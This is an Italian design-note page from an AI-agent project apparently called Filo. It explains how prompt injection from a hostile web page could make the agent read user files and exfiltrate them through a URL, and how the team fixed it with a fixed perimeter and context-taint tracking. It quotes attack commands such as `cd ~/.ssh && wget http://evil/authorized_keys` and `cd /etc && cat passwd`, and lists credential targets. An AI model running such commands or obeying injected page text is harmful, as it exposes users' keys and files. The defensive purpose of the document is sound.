# Un confine che l'agente può spostare da solo non è un confine

[← Tutti i pattern](../PATTERNS.md)

Le difese di Filo contro un modello pilotato da una pagina ostile si agganciano
a qualcosa. Il pattern è su **cosa**: se quel qualcosa lo può cambiare l'agente
stesso, o lo sceglie chi attacca, la difesa esiste solo sulla carta.

Due casi veri, tutti e due trovati nell'audit #587, tutti e due sulla stessa
catena: pagina ostile → il modello legge un file dell'utente → il modello apre
`https://sito/?d=<contenuto>`.

## Caso 1 — il perimetro agganciato alla cartella di lavoro

Il freno naturale su «quali file può leggere senza chiedere» è la cartella di
lavoro: dentro sì, fuori chiedi. Non funziona, perché **`cd` è livello 1**: non
legge niente, quindi non ha motivo di chiedere conferma, ed è la primitiva di
navigazione dell'agente (pretendere un OK a ogni spostamento la rende
inutilizzabile). Ma allora `cd /etc && cat passwd` sposta il perimetro e poi ci
legge dentro, con due comandi che uno per uno sono innocui. È la stessa forma
del #479, dove `cd ~/.ssh && wget http://evil/authorized_keys` faceva atterrare
un file esattamente dove `wget -O ~/.ssh/authorized_keys` chiedeva di digitare
«conferma».

La cura è **dichiarare il perimetro fuori dalla portata dell'agente**: in
`src/shared/cmdClassify.js` è `perimetro`, che il main riempie con la cartella da
cui l'assistente PARTE (la home), non con quella dove si trova adesso. La
cartella corrente serve solo a risolvere i percorsi relativi, e i `cd` dentro una
sequenza si SEGUONO, così `cat passwd` dopo un `cd /etc` viene misurato in
`/etc`. Fra un turno e l'altro la cartella vera la passa il main, quindi
concatenare o spezzare in due turni dà lo stesso esito.

Corollario: siccome il perimetro dichiarato è la home, «dentro il perimetro» non
può bastare. I **bersagli riservati** (`.ssh`, `.aws`, `.env`,
`.git-credentials`, `AppData`, le cronologie della shell) non sono livello 1
nemmeno lì, e l'ambiente (`printenv`, `$env:`, `%APPDATA%`) non lo è mai: una
variabile nasconde al classificatore il file vero che il comando aprirà.

## Caso 2 — la fiducia agganciata al mittente

Il ripiego strutturale dell'anti-esfiltrazione (`src/shared/urlExfil.js`) si
accendeva solo `fromUntrusted`, e `fromUntrusted` guardava **l'origine del
mittente del messaggio**. La chat della home è `filo://`, cioè fidata: il ripiego
non si accendeva mai, nemmeno con mezza pagina ostile davanti al modello. Chi
manda il messaggio non dice niente su cosa il modello ha in testa.

La cura è misurare **cosa è entrato nel contesto**, non chi ha parlato:
`src/main/services/contextTaint.js` registra il materiale non fidato mentre entra
(output dei comandi, risultati di ricerca, documenti aperti dal disco) e lo tiene
appeso al webContents della scheda, che vive quanto la conversazione. L'origine
`http(s)` resta una delle sorgenti, non più l'unica.

Lo stesso registro risolve l'altra metà del buco: il corpus su cui si fa il
taint-match conteneva solo i dati persistenti (memoria, profilo, appunti), quindi
un file appena letto con `cat` non c'era e l'indirizzo che ne riportava fuori un
pezzo passava come livello 1. Quello che il modello ha appena letto è esattamente
quello che una pagina ostile gli chiederà di riscrivere in un URL: se entra nel
contesto, entra nel corpus.

## Regola operativa

Quando aggiungi una difesa, scrivi accanto **a cosa è agganciata** e chiediti chi
può cambiare quel valore. Se la risposta è «l'agente, con un'azione che non
chiede niente» o «la pagina», l'aggancio è sbagliato: spostalo su qualcosa che
decide il main e che l'LLM non può toccare (in `executeFiloAction` i campi
iniettati prima del gate hanno il prefisso `_` e vengono sovrascritti sempre,
proprio perché un valore che arrivasse dal modello non deve poter allargare
niente).

E cerca la **strada equivalente** prima di consegnare: chiudere il terminale e
lasciare `LEGGI_DOCUMENTO` a livello 1 avrebbe solo spostato la porta, visto che
quell'azione apre dal disco gli stessi file. Due strade per la stessa cosa hanno
lo stesso livello, oppure la più economica è l'unica che verrà usata.

## Dove guardare

- `src/shared/cmdClassify.js` — `perimetro`, `readReason`, `pathReason`.
- `src/main/services/contextTaint.js` — il registro del materiale non fidato.
- `src/main/services/handlers.js` — `navExfilCorpus`, l'iniezione di
  `_perimetro`/`_cwdReale`/`_motivoPerimetro` prima del gate dei livelli.
- `tests/unit/cmdClassify.test.mjs`, `tests/unit/contextTaint.test.mjs`,
  `tests/filo-naviga-exfil.spec.mjs`.
